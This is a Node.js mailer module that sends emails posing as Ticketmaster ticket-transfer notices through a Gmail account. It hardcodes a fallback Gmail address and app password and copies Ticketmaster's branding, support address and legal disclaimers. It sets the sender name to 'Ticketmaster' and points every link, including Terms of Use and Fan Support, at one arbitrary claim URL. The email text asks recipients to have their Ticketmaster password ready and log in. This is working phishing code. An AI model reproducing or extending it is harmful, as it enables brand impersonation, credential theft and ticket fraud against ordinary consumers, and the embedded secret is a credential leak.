// utils/mailer.js — Gmail & SMTP Email Service for Ticketmaster Ticket Transfers
const nodemailer = require('nodemailer');
const fs = require('fs');
const path = require('path');

const CONFIG_FILE = path.join(__dirname, '..', 'gmail_config.json');
const ENV_FILE = path.join(__dirname, '..', '.env');

// Load persisted config if present
let emailConfig = {
  user: process.env.GMAIL_USER || 'noreplyticketmasterauth@gmail.com',
  pass: process.env.GMAIL_APP_PASSWORD || 'injrseooszfsfton',
  service: 'gmail'
};

try {
  if (fs.existsSync(CONFIG_FILE)) {
    const saved = JSON.parse(fs.readFileSync(CONFIG_FILE, 'utf8'));
    if (saved.user && !emailConfig.user) emailConfig.user = saved.user;
    if (saved.pass && !emailConfig.pass) emailConfig.pass = saved.pass;
  }
} catch (e) {}

function getEmailConfig() {
  const user = process.env.GMAIL_USER || emailConfig.user || '';
  const pass = process.env.GMAIL_APP_PASSWORD || emailConfig.pass || '';
  return {
    user,
    isConfigured: !!(user && pass),
    maskedUser: user
      ? user.replace(/(.{2})(.*)(?=@)/, (gp1, gp2, gp3) => gp2 + '*'.repeat(gp3.length))
      : ''
  };
}

function updateEmailConfig(user, pass) {
  if (user !== undefined && user.trim()) {
    emailConfig.user = user.trim();
    process.env.GMAIL_USER = user.trim();
  }
  if (pass !== undefined && pass.trim()) {
    emailConfig.pass = pass.trim();
    process.env.GMAIL_APP_PASSWORD = pass.trim();
  }

  // Persist to gmail_config.json
  try {
    fs.writeFileSync(CONFIG_FILE, JSON.stringify({
      user: emailConfig.user,
      pass: emailConfig.pass
    }, null, 2));
  } catch (e) {}

  // Also update .env file so restarts keep it
  try {
    if (fs.existsSync(ENV_FILE)) {
      let envContent = fs.readFileSync(ENV_FILE, 'utf8');
      if (emailConfig.user) {
        if (/^GMAIL_USER=.*$/m.test(envContent)) {
          envContent = envContent.replace(/^GMAIL_USER=.*$/m, `GMAIL_USER=${emailConfig.user}`);
        } else {
          envContent += `\nGMAIL_USER=${emailConfig.user}`;
        }
      }
      if (emailConfig.pass) {
        if (/^GMAIL_APP_PASSWORD=.*$/m.test(envContent)) {
          envContent = envContent.replace(/^GMAIL_APP_PASSWORD=.*$/m, `GMAIL_APP_PASSWORD=${emailConfig.pass}`);
        } else {
          envContent += `\nGMAIL_APP_PASSWORD=${emailConfig.pass}`;
        }
      }
      fs.writeFileSync(ENV_FILE, envContent, 'utf8');
    }
  } catch (e) {}

  return getEmailConfig();
}

function createTransporter() {
  const user = process.env.GMAIL_USER || emailConfig.user;
  const pass = process.env.GMAIL_APP_PASSWORD || emailConfig.pass;

  if (!user || !pass) {
    return null;
  }

  return nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: user,
      pass: pass
    }
  });
}

/**
 * Generate Responsive HTML email matching the Ticketmaster transfer video
 */
function generateTransferEmailHtml({ senderName, recipientName, event, tickets, note, claimUrl, baseUrl }) {
  const tixList = Array.isArray(tickets) ? tickets : [];
  const count = tixList.length || 1;
  const firstTicket = tixList[0] || {};
  const section = firstTicket.section || event.section || 'GA';
  const row = firstTicket.row_name || event.row_name || 'GA';
  const seatNums = tixList.map(t => t.seat_number || t.seat_label || 'GA').join(', ');
  const seatString = seatNums ? `Seat ${seatNums}` : 'General Admission';

  // Resolve absolute image url
  let artistImg = event.artist_image || '/assets/u2_banner.jpg';
  if (!artistImg.startsWith('http')) {
    artistImg = `${baseUrl.replace(/\/+$/, '')}${artistImg.startsWith('/') ? '' : '/'}${artistImg}`;
  }

  return `
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>${senderName} sent you ticket(s)</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background-color: #0d0e12;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
      color: #ffffff;
      -webkit-font-smoothing: antialiased;
    }
    .wrapper {
      width: 100%;
      background-color: #0d0e12;
      padding: 24px 12px;
      box-sizing: border-box;
    }
    .email-container {
      max-width: 480px;
      margin: 0 auto;
      background-color: #121318;
      border-radius: 12px;
      overflow: hidden;
      border: 1px solid #23252e;
    }
    .top-blue-bar {
      height: 4px;
      background-color: #026cdf;
      width: 100%;
    }
    .header-area {
      padding: 24px 20px 16px 20px;
      text-align: center;
    }
    .main-title {
      font-size: 19px;
      font-weight: 700;
      line-height: 1.35;
      color: #ffffff;
      margin: 0 0 20px 0;
    }
    /* Stepper */
    .stepper-container {
      display: flex;
      align-items: center;
      justify-content: space-between;
      margin: 10px 16px 20px 16px;
      position: relative;
    }
    .step-item {
      display: flex;
      flex-direction: column;
      align-items: center;
      position: relative;
      z-index: 2;
    }
    .step-circle {
      width: 32px;
      height: 32px;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 14px;
      font-weight: 700;
      margin-bottom: 6px;
    }
    .step-circle.active {
      background-color: #026cdf;
      color: #ffffff;
      box-shadow: 0 0 10px rgba(2, 108, 223, 0.5);
    }
    .step-circle.inactive {
      background-color: #23252e;
      color: #71717a;
      border: 1.5px solid #3f3f46;
    }
    .step-label {
      font-size: 11px;
      color: #9ca3af;
      font-weight: 500;
    }
    .step-label.active {
      color: #ffffff;
      font-weight: 600;
    }
    .step-line {
      flex: 1;
      height: 2px;
      background-color: #2d303a;
      margin: 0 8px 18px 8px;
    }
    /* Event Box */
    .event-card {
      background-color: #1a1b22;
      border: 1px solid #282a35;
      border-radius: 8px;
      padding: 16px;
      margin: 0 16px 16px 16px;
    }
    .event-artist {
      font-size: 15px;
      font-weight: 800;
      color: #ffffff;
      letter-spacing: 0.3px;
      margin-bottom: 4px;
      text-transform: uppercase;
    }
    .event-date-row {
      font-size: 13px;
      color: #9ca3af;
      margin-bottom: 3px;
    }
    .event-venue-row {
      font-size: 13px;
      color: #9ca3af;
      margin-bottom: 12px;
    }
    .event-seats-row {
      font-size: 13.5px;
      font-weight: 600;
      color: #e5e7eb;
      margin-bottom: 12px;
      padding-top: 8px;
      border-top: 1px solid #282a35;
    }
    .event-image-box {
      width: 100%;
      height: 180px;
      overflow: hidden;
      border-radius: 6px;
      margin-bottom: 16px;
      background-color: #000000;
    }
    .event-image-box img {
      width: 100%;
      height: 100%;
      object-fit: cover;
      display: block;
    }
    .btn-accept {
      display: block;
      width: 100%;
      box-sizing: border-box;
      background-color: #026cdf;
      color: #ffffff !important;
      text-align: center;
      padding: 14px 20px;
      border-radius: 4px;
      font-weight: 700;
      font-size: 15px;
      letter-spacing: 0.6px;
      text-decoration: none;
      box-shadow: 0 4px 12px rgba(2, 108, 223, 0.35);
    }
    .btn-disclaimer {
      font-size: 11px;
      color: #71717a;
      line-height: 1.45;
      margin-top: 14px;
      text-align: left;
    }
    .btn-disclaimer a {
      color: #38bdf8;
      text-decoration: none;
    }
    /* Note box */
    .note-box {
      background: linear-gradient(180deg, rgba(39, 39, 42, 0.4) 0%, rgba(24, 24, 27, 0.6) 100%);
      border: 1px solid #3f3f46;
      border-radius: 6px;
      padding: 12px 14px;
      margin: 0 16px 16px 16px;
    }
    .note-sender {
      color: #e879f9;
      font-size: 12.5px;
      font-weight: 700;
      margin-bottom: 4px;
    }
    .note-body {
      color: #e4e4e7;
      font-size: 13px;
      font-style: italic;
    }
    /* Info text */
    .info-section {
      padding: 0 16px 16px 16px;
    }
    .info-heading {
      font-size: 14px;
      font-weight: 700;
      color: #ffffff;
      margin-top: 14px;
      margin-bottom: 4px;
    }
    .info-text {
      font-size: 12.5px;
      color: #9ca3af;
      line-height: 1.5;
      margin: 0;
    }
    .info-text a {
      color: #38bdf8;
      text-decoration: none;
    }
    /* Help */
    .help-box {
      text-align: center;
      padding: 16px;
      border-top: 1px solid #23252e;
      margin-top: 10px;
    }
    .help-title {
      font-size: 13px;
      font-weight: 700;
      color: #ffffff;
      margin-bottom: 4px;
    }
    .help-sub {
      font-size: 12px;
      color: #9ca3af;
    }
    .help-sub a {
      color: #38bdf8;
      text-decoration: none;
    }
    /* Blue Footer */
    .blue-footer {
      background-color: #026cdf;
      color: #ffffff;
      padding: 16px 20px;
      text-align: center;
      font-size: 11px;
      line-height: 1.5;
    }
    .blue-footer-title {
      font-weight: 700;
      font-size: 12px;
      margin-bottom: 2px;
    }
  </style>
</head>
<body>
  <div class="wrapper">
    <div class="email-container">
      <div class="top-blue-bar"></div>

      <div class="header-area">
        <h1 class="main-title">Your Ticket Transfer From ${senderName} Is Ready To Be Accepted!</h1>

        <!-- Visual Progress Stepper -->
        <table width="100%" cellpadding="0" cellspacing="0" style="margin-bottom: 16px;">
          <tr>
            <td align="center" width="30%">
              <div style="width:30px; height:30px; border-radius:50%; background:#026cdf; color:#ffffff; font-size:14px; line-height:30px; font-weight:bold; margin:0 auto 4px auto; text-align:center;">⚡</div>
              <div style="font-size:11px; color:#ffffff; font-weight:bold;">Received</div>
            </td>
            <td width="5%" align="center">
              <div style="height:2px; background:#374151; width:100%;"></div>
            </td>
            <td align="center" width="30%">
              <div style="width:30px; height:30px; border-radius:50%; background:#1f2937; color:#6b7280; font-size:13px; line-height:28px; border:1px solid #374151; margin:0 auto 4px auto; text-align:center;">✓</div>
              <div style="font-size:11px; color:#9ca3af;">Accepted</div>
            </td>
            <td width="5%" align="center">
              <div style="height:2px; background:#374151; width:100%;"></div>
            </td>
            <td align="center" width="30%">
              <div style="width:30px; height:30px; border-radius:50%; background:#1f2937; color:#6b7280; font-size:13px; line-height:28px; border:1px solid #374151; margin:0 auto 4px auto; text-align:center;">🎟</div>
              <div style="font-size:11px; color:#9ca3af;">Claimed</div>
            </td>
          </tr>
        </table>
      </div>

      <!-- Event Card -->
      <div class="event-card">
        <div class="event-artist">${event.artist_name}</div>
        <div class="event-date-row">${event.event_date}</div>
        <div class="event-venue-row">${event.venue_name} - ${event.venue_city}</div>
        
        <div class="event-seats-row">
          Section ${section}, Row ${row}, ${seatString}
        </div>

        <div class="event-image-box">
          <img src="${artistImg}" alt="${event.artist_name}">
        </div>

        <table width="100%" cellpadding="0" cellspacing="0">
          <tr>
            <td align="center">
              <a href="${claimUrl}" target="_blank" class="btn-accept" style="display:block; width:100%; box-sizing:border-box; background-color:#026cdf; color:#ffffff; text-align:center; padding:14px 20px; border-radius:4px; font-weight:700; font-size:15px; letter-spacing:0.6px; text-decoration:none;">ACCEPT TICKETS</a>
            </td>
          </tr>
        </table>

        <div class="btn-disclaimer">
          By clicking 'ACCEPT TICKETS', you agree to our <a href="${claimUrl}">Terms of Use</a> and any applicable Ticketmaster Terms.<br><br>
          If the tickets were obtained fraudulently by the person transferring them, they may be canceled at any time, removed from your account and no longer available for use.<br><br>
          This email is NOT your ticket.
        </div>
      </div>

      <!-- Message from Sender -->
      <div class="note-box">
        <div class="note-sender">A Message from ${senderName}...</div>
        <div class="note-body">"${note ? note : 'No message included.'}"</div>
      </div>

      <!-- Information Flow -->
      <div class="info-section">
        <div class="info-heading">Transfer Status: Received</div>
        <p class="info-text">
          You got ${count} ticket(s)! You're one step closer to seeing ${event.artist_name}
        </p>

        <div class="info-heading">What's Next?</div>
        <p class="info-text">
          You'll need to first accept the ticket transfer so the order is moved to your Ticketmaster account. Once the transfer is complete, we'll let ${senderName} know you're all set. To accept the tickets, have your Ticketmaster password handy and login to your Ticketmaster account, or create a <a href="${claimUrl}">new one</a>. Visit <a href="${claimUrl}">Event Details</a> to view your ticket(s).
        </p>
      </div>

      <!-- Help section -->
      <div class="help-box">
        <div class="help-title">We're here to help</div>
        <div class="help-sub">
          If you have any questions, please contact <a href="${claimUrl}">Ticketmaster Fan Support</a>.
        </div>
      </div>

      <!-- Blue Footer -->
      <div class="blue-footer">
        <div class="blue-footer-title">Ticketmaster, Attn: Fan Support</div>
        707 Virginia Street East, Suite 170, Charleston, WV 25301<br>
        © 2026 Ticketmaster. All rights reserved.
      </div>
    </div>
  </div>
</body>
</html>
  `.trim();
}

/**
 * Send Transfer Email via Gmail (or provide detailed fallback / dry-run if credentials pending)
 */
async function sendTransferEmail({ senderName, recipientEmail, recipientName, event, tickets, note, claimUrl, baseUrl }) {
  const html = generateTransferEmailHtml({
    senderName,
    recipientName,
    event,
    tickets,
    note,
    claimUrl,
    baseUrl
  });

  const subject = `${senderName} sent you ticket(s) ${event.artist_name}`;
  const transporter = createTransporter();

  console.log(`\n======================================================`);
  console.log(`📨 [Ticketmaster Transfer Email Generated]`);
  console.log(`👉 Subject: ${subject}`);
  console.log(`👉 To: ${recipientEmail} (${recipientName})`);
  console.log(`👉 From: ${senderName}`);
  console.log(`👉 Claim Link: ${claimUrl}`);
  console.log(`======================================================\n`);

  if (!transporter) {
    console.warn(`⚠️ [Gmail Mailer] GMAIL_USER or GMAIL_APP_PASSWORD not set in environment or settings. Email simulated.`);
    return {
      success: true,
      deliveredViaGmail: false,
      reason: 'GMAIL_CONFIG_MISSING',
      message: 'Email generated successfully! Set GMAIL_USER and GMAIL_APP_PASSWORD in settings or .env to send via live Gmail SMTP.',
      claimUrl,
      subject
    };
  }

  try {
    const senderEmail = process.env.GMAIL_USER || emailConfig.user;
    const info = await transporter.sendMail({
      from: `"Ticketmaster" <${senderEmail}>`,
      to: recipientEmail,
      subject: subject,
      html: html
    });

    console.log(`✅ [Gmail Mailer] Real Gmail message sent! ID: ${info.messageId}`);
    return {
      success: true,
      deliveredViaGmail: true,
      messageId: info.messageId,
      message: `Ticket transfer email delivered to ${recipientEmail} via Gmail.`,
      claimUrl,
      subject
    };
  } catch (err) {
    console.error(`❌ [Gmail Mailer] Failed to send email via Gmail:`, err.message);
    return {
      success: true, // Still allow transfer to succeed even if Gmail SMTP fails
      deliveredViaGmail: false,
      reason: 'GMAIL_ERROR',
      error: err.message,
      message: `Transfer recorded, but Gmail SMTP failed: ${err.message}. You can share the claim link directly.`,
      claimUrl,
      subject
    };
  }
}

/**
 * Send a verification/test email from Gmail
 */
async function sendTestEmail(testRecipient) {
  const transporter = createTransporter();
  if (!transporter) {
    throw new Error('Gmail is not configured. Please supply GMAIL_USER and GMAIL_APP_PASSWORD.');
  }

  const senderEmail = process.env.GMAIL_USER || emailConfig.user;
  const info = await transporter.sendMail({
    from: `"Ticketmaster Support" <${senderEmail}>`,
    to: testRecipient || senderEmail,
    subject: `Ticketmaster Email Test: Connection Successful!`,
    html: `
      <div style="font-family:sans-serif; background:#0b0c0e; color:#ffffff; padding:24px; border-radius:8px;">
        <h2 style="color:#026cdf; margin-top:0;">✓ Ticketmaster Gmail Service Verified</h2>
        <p>Your Gmail credentials are valid and successfully connected to the Ticketmaster ticket transfer engine.</p>
        <p style="font-size:12px; color:#9ca3af;">Sent from ${senderEmail} at ${new Date().toLocaleString()}</p>
      </div>
    `
  });

  return info;
}

module.exports = {
  getEmailConfig,
  updateEmailConfig,
  generateTransferEmailHtml,
  sendTransferEmail,
  sendTestEmail
};
